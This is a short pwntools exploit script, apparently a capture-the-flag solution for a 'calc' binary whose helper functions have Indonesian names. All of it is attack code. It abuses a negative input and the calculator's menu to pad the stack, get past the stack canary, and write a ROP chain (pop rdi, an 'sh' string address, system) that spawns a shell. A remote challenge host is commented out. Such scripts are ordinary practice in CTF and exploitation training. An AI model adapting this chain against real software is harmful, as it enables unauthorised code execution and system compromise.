from pwn import *

elf = context.binary = ELF('calc', checksec=False)
context.terminal = "tmux splitw -h".split(" ")
#p = remote('139.59.231.54', 9001)
p = process(elf.path)
#cmd = """
#b * 0x0000000000401651
#continue
#"""
#gdb.attach(p)#, gdbscript=cmd)
pop_rdi = 0x0000000000401753
sh = 0x404060
system = 0x40120d
def berapa(n):
    p.sendlineafter(b": ", str(n).encode())
    return

def tambah(a,b):
    p.sendlineafter(b">> ", b"1")
    p.sendlineafter(b": ", str(a).encode())
    p.sendlineafter(b": ", str(b).encode())

def kurang(a,b):
    p.sendlineafter(b">> ", b"2")
    p.sendlineafter(b": ", str(a).encode())
    p.sendlineafter(b": ", str(a).encode())

berapa(-1)

# junks
for i in range(66):
    tambah(i+101,"+")

# bypass canary
p.sendlineafter(b">> ", b"5") 
p.sendlineafter(b">> ", b"5")

#junks
for i in range(2):
    tambah(i+101, "+")

# rop
tambah(pop_rdi-200, 200)
kurang(101, 101)
tambah(sh-200, 200)
kurang(101, 101)
tambah(200, system-200)
kurang(101, 101)

p.interactive()
